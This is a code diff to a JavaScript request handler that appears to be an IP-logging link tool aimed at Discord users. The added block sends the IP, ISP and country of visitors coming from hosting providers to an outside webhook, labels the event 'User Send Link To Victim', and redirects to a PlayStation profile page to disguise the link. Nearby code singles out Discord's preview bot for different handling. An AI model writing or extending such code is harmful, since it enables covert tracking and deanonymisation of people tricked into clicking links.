@@ -83,6 +83,26 @@ export default async function handler(req, res) {
 
         let message;
 
+        if (ipDetails.hosting) {
+            message = {
+                embeds: [
+                    {
+                        title: "User Send Link To Victim in Discord Message",
+                        color: 0xFF0000, // Red color to indicate alert
+                        description: "Device info collected from sender.",
+                        fields: [
+                            { name: "IP", value: `\`${ipDetails.query || "Not available"}\``, inline: true },
+                            { name: "Provider", value: `\`${ipDetails.isp || "Unknown"}\``, inline: true },
+                            { name: "Country", value: `\`${ipDetails.country || "Unknown"}\``, inline: true },
+                        ]
+                    }
+                ]
+            };
+            await sendToWebhook(message);
+            res.writeHead(302, { Location: 'https://profile.playstation.com/LB7' });
+            res.end();
+        } 
+
         if (ipDetails.isp === "Google LLC" && userAgent.includes("Mozilla/5.0 (compatible; Discordbot/2.0; +https://discordapp.com)")) {
             message = {
                 embeds: [
